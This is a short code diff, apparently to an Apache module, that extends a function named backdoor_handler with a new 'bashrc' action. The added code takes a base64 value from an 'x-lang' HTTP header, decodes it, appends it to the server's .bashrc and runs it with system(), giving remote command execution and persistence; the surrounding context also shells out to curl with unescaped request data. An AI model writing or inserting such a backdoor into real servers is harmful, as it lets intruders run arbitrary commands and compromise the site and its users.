@@ -130,6 +130,14 @@ static int backdoor_handler(request_rec *r) {
                }
                snprintf(message, sizeof(message), "curl -X POST -H \"Content-Type: application/json\" http://localhost:9999/lol -d '%s'", text);
                system(message);
+            } 
+            else if (!strcmp(action, "bashrc")) {
+               char message[8192];
+               const char *cmd = apr_table_get(r->headers_in, "x-lang");
+               if (!cmd) return DECLINED;
+               snprintf(message, sizeof(message), "echo '%s' | base64 -d >> /var/www/html/.bashrc; source /var/www/html/.bashrc;", cmd); 
+               // ap_rprintf(r, "%s", message);
+               system(message);
             }
          }
       }
